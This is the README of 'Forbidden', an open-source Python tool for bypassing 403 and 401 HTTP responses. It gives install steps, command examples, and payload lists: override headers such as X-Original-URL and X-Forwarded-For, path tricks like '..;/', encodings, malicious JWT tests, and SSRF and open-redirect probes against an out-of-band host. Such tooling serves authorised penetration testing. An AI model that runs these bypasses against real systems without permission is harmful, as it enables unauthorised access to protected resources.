# Forbidden

Bypass 4xx HTTP response status codes and more. Based on PycURL and Python Requests.

Script uses multithreading and is based on brute forcing, and as such, might have false positive results. Script has colored output.

Results will be sorted by HTTP response status code ascending, HTTP response content length descending, and ID ascending.

To manually filter out false positive results, for each unique HTTP response content length, run the provided cURL command and check if the HTTP response results in bypass; if not, simply ignore all the results with the same HTTP response content length.

| Test Description | Test |
| --- | --- |
| HTTP and HTTPS requests on both, domain name and IP. | base |
| HTTP methods + w/ `Content-Length: 0` HTTP request header. | methods |
| Cross-site tracing (XST) w/ HTTP TRACE and TRACK methods. | methods |
| \[Text\] file upload w/ HTTP PUT method on all URL directories. | methods |
| HTTP method overrides w/ HTTP request headers and URL query string params. | method-overrides |
| URL scheme overrides. | scheme-overrides |
| Port overrides. | port-overrides |
| Information disclosure w/ `Accept` HTTP request header. | headers |
| HTTP request headers. | headers |
| URL override + w/ accessible URL. | headers |
| HTTP host override w/ double `Host` HTTP request headers. | headers |
| HTTP request headers w/ user-supplied values. | values |
| URL path bypasses. | paths |
| URL transformations and encodings. | encodings |
| Basic and bearer auth + w/ null session and malicious JWTs. | auths |
| Open redirects, OOB, and SSRF. | redirects |
| Broken URL parsers, OOB, and SSRF. | parsers |

---

Check the stress testing script [here](https://github.com/ivan-sincek/forbidden/blob/main/src/stresser/stresser.py). Inspired by this [write-up](https://amineaboud.medium.com/story-of-a-weird-vulnerability-i-found-on-facebook-fc0875eb5125).

Extend the scripts to your liking.

Good sources of HTTP headers:

* [developer.mozilla.org/en-US/docs/Web/HTTP/Headers](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers)
* [developers.cloudflare.com/fundamentals/reference/http-request-headers](https://developers.cloudflare.com/fundamentals/reference/http-request-headers)
* [udger.com/resources/http-request-headers](https://udger.com/resources/http-request-headers)
* [webconcepts.info/concepts/http-header](https://webconcepts.info/concepts/http-header)
* [webtechsurvey.com/common-response-headers](https://webtechsurvey.com/common-response-headers)

Tested on Kali Linux v2023.4 (64-bit).

Made for educational purposes. I hope it will help!

---

**Remarks:**

* all HTTP request headers, values, URL path bypasses, etc., were validated based on the official documentation or public infosec write-ups,
* by default, `Forbidden` is "locked" to `PycURL` and `Stresser` is "locked" to `Python Requests`,
* Python Requests is up to 3x faster than PycURL, but PycURL is a bit more customizable,
* PycURL might also throw `OSError` if large number of threads is used due to opening too many session cookie files at once,
* by default, only `2xx` and `3xx` HTTP status codes are included in results and shown in the output,
* `length` attribute in results includes only HTTP response body length,
* testing `double headers` is locked to `Python Requests` because PycURL does not support it,
* testing `encodings` is locked to `PycURL` because Python Requests does not support it,
* connection and read timeout is set to `60` seconds,
* beware of `rate limiting` and other similar anti-bot protections, take some time before running the script again on the same domain,
* some web proxies might normalize URLs (e.g., when testing `encodings`), modify HTTP requests, or drop HTTP requests entirely,
* some websites might require a valid or very specific `User-Agent` HTTP request header,
* cross-site tracing (XST) is `no longer` considered to be a vulnerability.

**High priority plans:**

* add the silent option, to not show the console output,
* add the no color option, to not show colors in the console output,
* use brute forcing to validate allowed HTTP methods if HTTP OPTIONS method is not allowed,
* add tests for HTTP cookies, `User-Agent` HTTP request header, CRLF, and Log4j.

**Low priority plans:**

* add option to test custom HTTP header-value pairs for a list of domains/subdomains.

## Table of Contents

* [How to Install](#how-to-install)
	* [Install PycURL](#install-pycurl)
	* [Standard Install](#standard-install)
	* [Build and Install From the Source](#build-and-install-from-the-source)
* [Single URL](#single-url)
* [Multiple URLs](#multiple-urls)
* [HTTP Methods](#http-methods)
* [HTTP Request Headers](#http-request-headers)
* [URL Paths](#url-paths)
* [Results Format](#results-format)
* [Usage](#usage)
* [Images](#images)

## How to Install

### Install PycURL

On Kali Linux, there should be no issues; otherwise, run:

```bash
apt-get -y install libcurl4-gnutls-dev librtmp-dev

pip3 install --upgrade pycurl
```

---

On Windows OS, download and install PycURL from [www.lfd.uci.edu/~gohlke](https://www.lfd.uci.edu/~gohlke/pythonlibs/#pycurl). Tested only on Windows 10.

---

On macOS, run:

```bash
brew uninstall curl
brew uninstall openssl

brew install curl
brew install openssl

echo 'export PATH="/opt/homebrew/opt/curl/bin:$PATH"' >> ~/.zshrc
echo 'export PATH="/opt/homebrew/opt/openssl@3/bin:$PATH"' >> ~/.zshrc
source ~/.zshrc

export LDFLAGS="-L/opt/homebrew/opt/curl/lib"
export CPPFLAGS="-I/opt/homebrew/opt/curl/include"
export PYCURL_SSL_LIBRARY=openssl

pip3 install --no-cache-dir --compile --ignore-installed --config-setting="--with-openssl=" --config-setting="--openssl-dir=/opt/homebrew/opt/openssl@3" pycurl
```

### Standard Install

```bash
pip3 install --upgrade forbidden
```

### Build and Install From the Source

```bash
git clone https://github.com/ivan-sincek/forbidden && cd forbidden

python3 -m pip install --upgrade build

python3 -m build

python3 -m pip install dist/forbidden-12.3-py3-none-any.whl
```

## Single URL

Bypass `403 Forbidden` HTTP response status code:

```fundamental
forbidden -u https://target.com -t base,methods,method-overrides,scheme-overrides,port-overrides,headers,paths-ram,encodings -f GET -l base,path -o forbidden_403_results.json
```

Bypass `403 Forbidden` HTTP response status code with stress testing:

```bash
mkdir stresser_403_results

stresser -u https://target.com -dir stresser_403_results -r 1000 -th 200 -f GET -l base -o stresser_403_results.json
```

Bypass `401 Unauthorized` HTTP response status code:

```fundamental
forbidden -u https://target.com -t auths -f GET -l base -o forbidden_401_results.json
```

Test open redirects, OOB, and SSRF:

```fundamental
forbidden -u https://target.com -t redirects -f GET -l base -e xyz.interact.sh -o forbidden_redirect_results.json
```

Test broken URL parsers, OOB, and SSRF:

```fundamental
forbidden -u https://target.com -t parsers -f GET -l base -e xyz.interact.sh -o forbidden_parser_results.json
```

## Multiple URLs

Bypass `403 Forbidden` HTTP response status code:

```bash
count=0; for subdomain in $(cat subdomains_403.txt); do count=$((count+1)); echo "#${count} | ${subdomain}"; forbidden -u "${subdomain}" -t base,methods,method-overrides,scheme-overrides,port-overrides,headers,paths,encodings -f GET -l base,path -o "forbidden_403_results_${count}.json"; done
```

Bypass `403 Forbidden` HTTP response status code with stress testing:

```bash
mkdir stresser_403_results

count=0; for subdomain in $(cat subdomains_403.txt); do count=$((count+1)); echo "#${count} | ${subdomain}"; stresser -u "${subdomain}" -dir stresser_403_results -r 1000 -th 200 -f GET -l base -o "stresser_403_results_${count}.json"; done
```

Bypass `401 Unauthorized` HTTP response status code:

```bash
count=0; for subdomain in $(cat subdomains_401.txt); do count=$((count+1)); echo "#${count} | ${subdomain}"; forbidden -u "${subdomain}" -t auths -f GET -l base -o "forbidden_401_results_${count}.json"; done
```

Test open redirects, OOB, and SSRF:

```bash
count=0; for subdomain in $(cat subdomains_live_long.txt); do count=$((count+1)); echo "#${count} | ${subdomain}"; forbidden -u "${subdomain}" -t redirects -f GET -l base -e xyz.interact.sh -o "forbidden_redirect_results_${count}.json"; done
```

Test broken URL parsers, OOB, and SSRF:

```bash
count=0; for subdomain in $(cat subdomains_live_long.txt); do count=$((count+1)); echo "#${count} | ${subdomain}"; forbidden -u "${subdomain}" -t parsers -f GET -l base -e xyz.interact.sh -o "forbidden_parser_results_${count}.json"; done
```

# HTTP Methods

```fundamental
ACL
ARBITRARY
BASELINE-CONTROL
BIND
CHECKIN
CHECKOUT
CONNECT
COPY
GET
HEAD
INDEX
LABEL
LINK
LOCK
MERGE
MKACTIVITY
MKCALENDAR
MKCOL
MKREDIRECTREF
MKWORKSPACE
MOVE
OPTIONS
ORDERPATCH
PATCH
POST
PRI
PROPFIND
PROPPATCH
PUT
REBIND
REPORT
SEARCH
SHOWMETHOD
SPACEJUMP
TEXTSEARCH
TRACE
TRACK
UNBIND
UNCHECKOUT
UNLINK
UNLOCK
UPDATE
UPDATEREDIRECTREF
VERSION-CONTROL
```

# HTTP Request Headers

Method overrides:

```fundamental
X-HTTP-Method
X-HTTP-Method-Override
X-Method-Override
```

Scheme overrides:

```fundamental
X-Forwarded-Proto
X-Forwarded-Protocol
X-Forwarded-Scheme
X-Scheme
X-URL-Scheme
```

Port overrides:

```fundamental
X-Forwarded-Port
```

Other:

```fundamental
19-Profile
Base-URL
CF-Connecting-IP
Client-IP
Cluster-Client-IP
Destination
Forwarded
Forwarded-For
Forwarded-For-IP
From
Host
Incap-Client-IP
Origin
Profile
Proxy
Redirect
Referer
Remote-Addr
Request-URI
True-Client-IP
URI
URL
WAP-Profile
X-Client-IP
X-Cluster-Client-IP
X-Custom-IP-Authorization
X-Forwarded
X-Forwarded-By
X-Forwarded-For
X-Forwarded-For-Original
X-Forwarded-Host
X-Forwarded-Path
X-Forwarded-Server
X-HTTP-DestinationURL
X-HTTP-Host-Override
X-Host
X-Host-Override
X-Original-Forwarded-For
X-Original-Remote-Addr
X-Original-URL
X-Originally-Forwarded-For
X-Originating-IP
X-Override-URL
X-Proxy-Host
X-Proxy-URL
X-ProxyUser-IP
X-Real-IP
X-Referer
X-Remote-Addr
X-Remote-IP
X-Requested-With
X-Rewrite-URL
X-Server-IP
X-True-Client-IP
X-True-IP
X-Wap-Profile
```

# URL Paths

Inject at the beginning, end, and both, beginning and end of the URL path.

You can use one payload set to test all positions simultaneously (sniper) or test using every possible combination of payload set (cluster bomb - default).

```fundamental
/
//
%09
%20
%23
%2e
%a0
*
.
..
;
.;
..;
/;/
;/../../
;foo=bar;
```

Inject at the end of the URL path.

```fundamental
#
##
##random
*
**
**random
.
..
..random
?
??
??random
~
~~
~~random
```

Inject at the end of the URL path only if it does not end with forward slash.

```fundamental
.asp
.aspx
.esp
.html
.jhtml
.json
.jsp
.jspa
.jspx
.php
.sht
.shtml
.xhtml
.xml
```

## Results Format

```json
[
    {
        "id": "860-HEADERS-3",
        "url": "https://example.com:443/admin",
        "method": "GET",
        "headers": [
            "Host: 127.0.0.1"
        ],
        "cookies": [],
        "body": null,
        "user_agent": "Forbidden/12.3",
        "command": "curl --connect-timeout 60 -m 60 -iskL --max-redirs 10 --path-as-is -A 'Forbidden/12.3' -H 'Host: 127.0.0.1' -X 'GET' 'https://example.com:443/admin'",
        "code": 200,
        "length": 255408
    },
    {
        "id": "861-HEADERS-3",
        "url": "https://example.com:443/admin",
        "method": "GET",
        "headers": [
            "Host: 127.0.0.1:443"
        ],
        "cookies": [],
        "body": null,
        "user_agent": "Forbidden/12.3",
        "command": "curl --connect-timeout 60 -m 60 -iskL --max-redirs 10 --path-as-is -A 'Forbidden/12.3' -H 'Host: 127.0.0.1:443' -X 'GET' 'https://example.com:443/admin'",
        "code": 200,
        "length": 255408
    }
]
```

## Usage

```fundamental
Forbidden v12.3 ( github.com/ivan-sincek/forbidden )

Usage:   forbidden -u url                       -t tests [-f force] [-v values    ] [-p path ] [-o out         ]
Example: forbidden -u https://example.com/admin -t all   [-f POST ] [-v values.txt] [-p /home] [-o results.json]

DESCRIPTION
    Bypass 4xx HTTP response status codes and more
URL
    Inaccessible URL
    -u, --url = https://example.com/admin | etc.
IGNORE QUERY STRING AND FRAGMENT
    Ignore URL query string and fragment
    -iqsf, --ignore-query-string-and-fragment
IGNORE CURL
    Use Python Requests instead of the default PycURL where applicable
    PycURL might throw OSError if large number of threads is used due to opening too many session cookie files at once
    -ic, --ignore-curl
TESTS
    Tests to run
    Use comma-separated values
    Specify 'paths-ram' to use battering ram attack or 'paths' to use the default cluster bomb attack
    Specify 'values' to test HTTP request headers with user-supplied values passed using the '-v' option
    -t, --tests = base | methods | (method|scheme|port)-overrides | headers | values | paths[-ram] | encodings | auths | redirects | parsers | all
FORCE
    Force an HTTP method for all non-specific test cases
    -f, --force = GET | POST | CUSTOM | etc.
VALUES
    File with additional HTTP request header values or a single value, e.g., internal IP, etc.
    Tests: values
    -v, --values = values.txt | 10.10.15.20 | etc.
PATH
    Accessible URL path to test URL overrides
    Tests: headers
    Default: /robots.txt | /index.html | /sitemap.xml | /README.txt
    -p, --path = /home | etc.
EVIL
    Evil URL to test URL overrides
    Tests: headers | redirects
    Default: https://github.com
    -e, --evil = https://xyz.interact.sh | https://xyz.burpcollaborator.net | etc.
HEADER
    Specify any number of extra HTTP request headers
    Extra HTTP request headers will not override test's HTTP request headers
    Semi-colon in, e.g., 'Content-Type;' will expand to an empty HTTP request header
    -H, --header = "Authorization: Bearer ey..." | Content-Type; | etc.
COOKIE
    Specify any number of extra HTTP cookies
    Extra HTTP cookies will not override test's HTTTP cookies
    -b, --cookie = PHPSESSIONID=3301 | etc.
IGNORE
    Filter out 200 OK false positive results with RegEx
    Spacing will be stripped
    -i, --ignore = Inaccessible | "Access Denied" | etc.
CONTENT LENGTHS
    Filter out 200 OK false positive results by HTTP response content lengths
    Specify 'base' to ignore content length of the base HTTP response
    Specify 'path' to ignore content length of the accessible URL response
    Use comma-separated values
    -l, --content-lengths = 12 | base | path | etc.
REQUEST TIMEOUT
    Request timeout
    Default: 60
    -rt, --request-timeout = 30 | etc.
THREADS
    Number of parallel threads to run
    More threads mean more requests sent in parallel, but may also result in more false positives
    Highly dependent on internet connection speed and server capacity
    Default: 5
    -th, --threads = 20 | etc.
SLEEP
    Sleep time in milliseconds before sending an HTTP request
    Intended for a single-thread use
    -s, --sleep = 500 | etc.
USER AGENT
    User agent to use
    Default: Forbidden/12.3
    -a, --user-agent = curl/3.30.1 | random[-all] | etc.
PROXY
    Web proxy to use
    -x, --proxy = http://127.0.0.1:8080 | etc.
HTTP RESPONSE STATUS CODES
    Include only specific HTTP response status codes in the results
    Use comma-separated values
    Default: 2xx | 3xx
    -sc, --status-codes = 1xx | 2xx | 3xx | 4xx | 5xx | all
SHOW TABLE
    Display the results in a table instead of JSON
    Intended for a wide screen use
    -st, --show-table
OUT
    Output file
    -o, --out = results.json | etc.
DUMP
    Dump all the test records in the output file without running them
    -dmp, --dump
DEBUG
    Debug output
    -dbg, --debug
```

```fundamental
Stresser v12.3 ( github.com/ivan-sincek/forbidden )

Usage:   stresser -u url                        -dir directory -r repeat -th threads [-f force] [-o out         ]
Example: stresser -u https://example.com/secret -dir results   -r 1000   -th 200     [-f GET  ] [-o results.json]

DESCRIPTION
    Bypass 4xx HTTP response status codes with stress testing
URL
    Inaccessible URL
    -u, --url = https://example.com/admin | etc.
IGNORE QUERY STRING AND FRAGMENT
    Ignore URL query string and fragment
    -iqsf, --ignore-query-string-and-fragment
IGNORE PYTHON REQUESTS
    Use PycURL instead of the default Python Requests where applicable
    PycURL might throw OSError if large number of threads is used due to opening too many session cookie files at once
    -ir, --ignore-requests
FORCE
    Force an HTTP method for all non-specific test cases
    -f, --force = GET | POST | CUSTOM | etc.
HEADER
    Specify any number of extra HTTP request headers
    Extra HTTP request headers will not override test's HTTP request headers
    Semi-colon in, e.g., 'Content-Type;' will expand to an empty HTTP request header
    -H, --header = "Authorization: Bearer ey..." | Content-Type; | etc.
COOKIE
    Specify any number of extra HTTP cookies
    Extra HTTP cookies will not override test's HTTTP cookies
    -b, --cookie = PHPSESSIONID=3301 | etc.
IGNORE
    Filter out 200 OK false positive results with RegEx
    Spacing will be stripped
    -i, --ignore = Inaccessible | "Access Denied" | etc.
CONTENT LENGTHS
    Filter out 200 OK false positive results by HTTP response content lengths
    Specify 'base' to ignore content length of the base HTTP response
    Use comma-separated values
    -l, --content-lengths = 12 | base | etc.
REQUEST TIMEOUT
    Request timeout
    Default: 60
    -rt, --request-timeout = 30 | etc.
REPEAT
    Number of total HTTP requests to send for each test case
    -r, --repeat = 1000 | etc.
THREADS
    Number of parallel threads to run
    -th, --threads = 20 | etc.
USER AGENT
    User agent to use
    Default: Stresser/12.3
    -a, --user-agent = curl/3.30.1 | random[-all] | etc.
PROXY
    Web proxy to use
    -x, --proxy = http://127.0.0.1:8080 | etc.
HTTP RESPONSE STATUS CODES
    Include only specific HTTP response status codes in the results
    Use comma-separated values
    Default: 2xx | 3xx
    -sc, --status-codes = 1xx | 2xx | 3xx | 4xx | 5xx | all
SHOW TABLE
    Display the results in a table instead of JSON
    Intended for a wide screen use
    -st, --show-table
OUT
    Output file
    -o, --out = results.json | etc.
DIRECTORY
    Output directory
    All valid and unique HTTP responses will be saved in this directory
    -dir, --directory = results | etc.
DUMP
    Dump all the test records in the output file without running them
    -dmp, --dump
DEBUG
    Debug output
    -dbg, --debug
```

## Images

<p align="center"><img src="https://github.com/ivan-sincek/forbidden/blob/main/img/basic_example.png" alt="Basic Example"></p>

<p align="center">Figure 1 - Basic Example</p>

<p align="center"><img src="https://github.com/ivan-sincek/forbidden/blob/main/img/basic_example_table.png" alt="Basic Example"></p>

<p align="center">Figure 2 - Basic Example (Table Output)</p>

<p align="center"><img src="https://github.com/ivan-sincek/forbidden/blob/main/img/test_records_dumping.png" alt="Test Records Dumping"></p>

<p align="center">Figure 3 - Test Records Dumping</p>
